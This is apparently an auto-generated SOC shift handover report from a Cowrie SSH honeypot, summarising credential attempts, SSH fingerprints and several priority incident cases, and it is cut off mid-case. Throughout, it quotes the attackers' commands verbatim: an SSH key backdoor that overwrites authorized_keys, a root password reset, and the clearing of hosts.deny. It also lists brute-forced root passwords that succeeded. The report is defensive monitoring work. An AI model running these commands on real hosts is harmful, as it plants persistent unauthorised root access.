# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-10 |
| **Generated At** | 2026-05-10T22:53:50Z |
| **Shift Time** | 22:53 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **590** |
| Confirmed Threats | **579** |
| False Positives Filtered | **11** (1.9%) |
| Unique Attacker IPs | **25** |
| Countries of Origin | **14** |
| High Severity Cases | **23** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **567** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **146** |
| Unique Credential Pairs | **120** |
| Unique Usernames | **62** |
| Unique Passwords | **107** |
| Successful Auth Pairs | **16** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 23 |
| `ubuntu` | 23 |
| `345gs5662d34` | 12 |
| `admin` | 6 |
| `test` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 12 |
| `3245gs5662d34` | 11 |
| `1234` | 5 |
| `123456` | 4 |
| `test` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 12 |
| `root` | `3245gs5662d34` | 11 |
| `Ubuntu` | `123456` | 2 |
| `root` | `serverserver` | 2 |
| `ubuntu` | `6` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin1@3` | `202.165.15.132` | 2026-05-10T20:53:52 |
| `root` | `3245gs5662d34` | `202.165.15.132` | 2026-05-10T20:53:55 |
| `root` | `admin1234*` | `202.165.15.132` | 2026-05-10T20:54:48 |
| `root` | `admin*123` | `202.165.15.132` | 2026-05-10T21:00:23 |
| `root` | `admin@1234#` | `45.119.212.99` | 2026-05-10T21:04:36 |
| `root` | `3245gs5662d34` | `45.119.212.99` | 2026-05-10T21:04:41 |
| `root` | `digitalocean123` | `45.119.212.99` | 2026-05-10T21:09:37 |
| `root` | `admin@1` | `45.119.212.99` | 2026-05-10T21:20:30 |
| `root` | `admin@!@#$` | `128.14.225.164` | 2026-05-10T21:33:17 |
| `root` | `3245gs5662d34` | `128.14.225.164` | 2026-05-10T21:33:21 |
| `root` | `serverserver` | `14.103.115.162` | 2026-05-10T21:38:20 |
| `root` | `user2` | `128.14.225.164` | 2026-05-10T21:44:06 |
| `root` | `test@2020` | `78.44.192.210` | 2026-05-10T22:19:24 |
| `root` | `3245gs5662d34` | `78.44.192.210` | 2026-05-10T22:19:28 |
| `root` | `serverserver` | `78.44.192.210` | 2026-05-10T22:21:00 |
| `root` | `admin124` | `78.44.192.210` | 2026-05-10T22:25:53 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **590** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 174 |
| Go SSH scanner | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 139 | 5 |
| `03a80b21afa8...` | Modern SSH client | 28 | 1 |
| `084386fa7ae5...` | Mirai/variant | 2 | 2 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 139 | 5 | libssh-based |
| `03a80b21afa8...` | libssh | 28 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 7 | 3 | — |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 11 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:TeObrDuFjwAL"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.115.162`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `128.14.225.164`, `78.44.192.210`, `45.119.212.99`, `202.165.15.132`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **25** |
| Unique ASNs | **21** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | LOW |
| `AS29465` | MTN NIGERIA Communication limited | 1 | LOW |
| `AS265862` | BM SOLUCIONES S.R.L. | 1 | LOW |
| `AS272809` | THUNDERNET, C.A. | 1 | LOW |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 1 | HIGH |
| `AS16276` | OVH SAS | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (23)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-850f3ac08424

| Field | Detail |
|---|---|
| **Source IP** | `202.165.15[.]132` |
| **First Seen** | 2026-05-10 20:53 |
| **Last Seen** | 2026-05-10 20:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 20:53:52` | `cowrie.session.connect` |
| `2026-05-10 20:53:52` | `cowrie.client.version` |
| `2026-05-10 20:53:52` | `cowrie.client.kex` |
| `2026-05-10 20:53:52` | `cowrie.login.success` |
| `2026-05-10 20:53:52` | `cowrie.session.params` |
| `2026-05-10 20:53:52` | `cowrie.command.input` |
| `2026-05-10 20:53:52` | `cowrie.command.failed` |
| `2026-05-10 20:53:52` | `cowrie.log.closed` |
| `2026-05-10 20:53:52` | `cowrie.session.params` |
| `2026-05-10 20:53:52` | `cowrie.command.input` |
| `2026-05-10 20:53:53` | `cowrie.session.file_download` |
| `2026-05-10 20:53:53` | `cowrie.log.closed` |
| `2026-05-10 20:53:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.15[.]132` to AbuseIPDB if not already reported
- [ ] Block `202.165.15[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79341440361e

| Field | Detail |
|---|---|
| **Source IP** | `202.165.15[.]132` |
| **First Seen** | 2026-05-10 20:53 |
| **Last Seen** | 2026-05-10 20:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 20:53:54` | `cowrie.session.connect` |
| `2026-05-10 20:53:54` | `cowrie.client.version` |
| `2026-05-10 20:53:54` | `cowrie.client.kex` |
| `2026-05-10 20:53:55` | `cowrie.login.success` |
| `2026-05-10 20:53:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.15[.]132` to AbuseIPDB if not already reported
- [ ] Block `202.165.15[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5f1af689525

| Field | Detail |
|---|---|
| **Source IP** | `202.165.15[.]132` |
| **First Seen** | 2026-05-10 20:54 |
| **Last Seen** | 2026-05-10 20:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 20:54:47` | `cowrie.session.connect` |
| `2026-05-10 20:54:47` | `cowrie.client.version` |
| `2026-05-10 20:54:47` | `cowrie.client.kex` |
| `2026-05-10 20:54:48` | `cowrie.login.success` |
| `2026-05-10 20:54:48` | `cowrie.session.params` |
| `2026-05-10 20:54:48` | `cowrie.command.input` |
| `2026-05-10 20:54:48` | `cowrie.command.failed` |
| `2026-05-10 20:54:48` | `cowrie.log.closed` |
| `2026-05-10 20:54:48` | `cowrie.session.params` |
| `2026-05-10 20:54:48` | `cowrie.command.input` |
| `2026-05-10 20:54:48` | `cowrie.session.file_download` |
| `2026-05-10 20:54:48` | `cowrie.log.closed` |
| `2026-05-10 20:54:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.15[.]132` to AbuseIPDB if not already reported
- [ ] Block `202.165.15[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9bcd34ca749

| Field | Detail |
|---|---|
| **Source IP** | `202.165.15[.]132` |
| **First Seen** | 2026-05-10 20:54 |
| **Last Seen** | 2026-05-10 20:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 20:54:50` | `cowrie.session.connect` |
| `2026-05-10 20:54:50` | `cowrie.client.version` |
| `2026-05-10 20:54:50` | `cowrie.client.kex` |
| `2026-05-10 20:54:50` | `cowrie.login.success` |
| `2026-05-10 20:54:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.15[.]132` to AbuseIPDB if not already reported
- [ ] Block `202.165.15[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-641aae173a71

| Field | Detail |
|---|---|
| **Source IP** | `202.165.15[.]132` |
| **First Seen** | 2026-05-10 21:00 |
| **Last Seen** | 2026-05-10 21:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 21:00:22` | `cowrie.session.connect` |
| `2026-05-10 21:00:22` | `cowrie.client.version` |
| `2026-05-10 21:00:22` | `cowrie.client.kex` |
| `2026-05-10 21:00:23` | `cowrie.login.success` |
| `2026-05-10 21:00:23` | `cowrie.session.params` |
| `2026-05-10 21:00:23` | `cowrie.command.input` |
| `2026-05-10 21:00:23` | `cowrie.command.failed` |
| `2026-05-10 21:00:23` | `cowrie.log.closed` |
| `2026-05-10 21:00:23` | `cowrie.session.params` |
| `2026-05-10 21:00:23` | `cowrie.command.input` |
| `2026-05-10 21:00:23` | `cowrie.session.file_download` |
| `2026-05-10 21:00:23` | `cowrie.log.closed` |
| `2026-05-10 21:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.15[.]132` to AbuseIPDB if not already reported
- [ ] Block `202.165.15[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ffaf5578c55

| Field | Detail |
|---|---|
| **Source IP** | `202.165.15[.]132` |
| **First Seen** | 2026-05-10 21:00 |
| **Last Seen** | 2026-05-10 21:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 21:00:25` | `cowrie.session.connect` |
| `2026-05-10 21:00:25` | `cowrie.client.version` |
| `2026-05-10 21:00:25` | `cowrie.client.kex` |
| `2026-05-10 21:00:25` | `cowrie.login.success` |
| `2026-05-10 21:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.165.15[.]132` to AbuseIPDB if not already reported
- [ ] Block `202.165.15[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb5051afcd7b

| Field | Detail |
|---|---|
| **Source IP** | `45.119.212[.]99` |
| **First Seen** | 2026-05-10 21:04 |
| **Last Seen** | 2026-05-10 21:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 21:04:35` | `cowrie.session.connect` |
| `2026-05-10 21:04:35` | `cowrie.client.version` |
| `2026-05-10 21:04:35` | `cowrie.client.kex` |
| `2026-05-10 21:04:36` | `cowrie.login.success` |
| `2026-05-10 21:04:37` | `cowrie.session.params` |
| `2026-05-10 21:04:37` | `cowrie.command.input` |
| `2026-05-10 21:04:37` | `cowrie.command.failed` |
| `2026-05-10 21:04:38` | `cowrie.log.closed` |
| `2026-05-10 21:04:38` | `cowrie.session.params` |
| `2026-05-10 21:04:38` | `cowrie.command.input` |
| `2026-05-10 21:04:38` | `cowrie.session.file_download` |
| `2026-05-10 21:04:38` | `cowrie.log.closed` |
| `2026-05-10 21:04:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.119.212[.]99` to AbuseIPDB if not already reported
- [ ] Block `45.119.212[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f14641bc8aa1

| Field | Detail |
|---|---|
| **Source IP** | `45.119.212[.]99` |
| **First Seen** | 2026-05-10 21:04 |
| **Last Seen** | 2026-05-10 21:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 21:04:40` | `cowrie.session.connect` |
| `2026-05-10 21:04:40` | `cowrie.client.version` |
| `2026-05-10 21:04:41` | `cowrie.client.kex` |
| `2026-05-10 21:04:41` | `cowrie.login.success` |
| `2026-05-10 21:04:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.119.212[.]99` to AbuseIPDB if not already reported
- [ ] Block `45.119.212[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ffe9d2847b6

| Field | Detail |
|---|---|
| **Source IP** | `45.119.212[.]99` |
| **First Seen** | 2026-05-10 21:09 |
| **Last Seen** | 2026-05-10 21:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 21:09:36` | `cowrie.session.connect` |
| `2026-05-10 21:09:36` | `cowrie.client.version` |
| `2026-05-10 21:09:36` | `cowrie.client.kex` |
| `2026-05-10 21:09:37` | `cowrie.login.success` |
| `2026-05-10 21:09:37` | `cowrie.session.params` |
| `2026-05-10 21:09:37` | `cowrie.command.input` |
| `2026-05-10 21:09:37` | `cowrie.command.failed` |
| `2026-05-10 21:09:37` | `cowrie.log.closed` |
| `2026-05-10 21:09:37` | `cowrie.session.params` |
| `2026-05-10 21:09:37` | `cowrie.command.input` |
| `2026-05-10 21:09:37` | `cowrie.session.file_download` |
| `2026-05-10 21:09:37` | `cowrie.log.closed` |
| `2026-05-10 21:09:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.119.212[.]99` to AbuseIPDB if not already reported
- [ ] Block `45.119.212[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ea7414fee0e

| Field | Detail |
|---|---|
| **Source IP** | `45.119.212[.]99` |
| **First Seen** | 2026-05-10 21:09 |
| **Last Seen** | 2026-05-10 21:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 21:09:39` | `cowrie.session.connect` |
| `2026-05-10 21:09:39` | `cowrie.client.version` |
| `2026-05-10 21:09:39` | `cowrie.client.kex` |
| `2026-05-10 21:09:40` | `cowrie.login.success` |
| `2026-05-10 21:09:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.119.212[.]99` to AbuseIPDB if not already reported
- [ ] Block `45.119.212[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d83d45c0ccc

| Field | Detail |
|---|---|
| **Source IP** | `45.119.212[.]99` |
| **First Seen** | 2026-05-10 21:20 |
| **Last Seen** | 2026-05-10 21:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 21:20:29` | `cowrie.session.connect` |
| `2026-05-10 21:20:29` | `cowrie.client.version` |
| `2026-05-10 21:20:30` | `cowrie.client.kex` |
| `2026-05-10 21:20:30` | `cowrie.login.success` |
| `2026-05-10 21:20:31` | `cowrie.session.params` |
| `2026-05-10 21:20:31` | `cowrie.command.input` |
| `2026-05-10 21:20:31` | `cowrie.command.failed` |
| `2026-05-10 21:20:31` | `cowrie.log.closed` |
| `2026-05-10 21:20:31` | `cowrie.session.params` |
| `2026-05-10 21:20:31` | `cowrie.command.input` |
| `2026-05-10 21:20:32` | `cowrie.session.file_download` |
| `2026-05-10 21:20:32` | `cowrie.log.closed` |
| `2026-05-10 21:20:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.119.212[.]99` to AbuseIPDB if not already reported
- [ ] Block `45.119.212[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a3d4af5d134

| Field | Detail |
|---|---|
| **Source IP** | `45.119.212[.]99` |
| **First Seen** | 2026-05-10 21:20 |
| **Last Seen** | 2026-05-10 21:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 21:20:34` | `cowrie.session.connect` |
| `2026-05-10 21:20:34` | `cowrie.client.version` |
| `2026-05-10 21:20:34` | `cowrie.client.kex` |
| `2026-05-10 21:20:35` | `cowrie.login.success` |
| `2026-05-10 21:20:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.119.212[.]99` to AbuseIPDB if not already reported
- [ ] Block `45.119.212[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ee658b740ba

| Field | Detail |
|---|---|
| **Source IP** | `128.14.225[.]164` |
| **First Seen** | 2026-05-10 21:33 |
| **Last Seen** | 2026-05-10 21:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
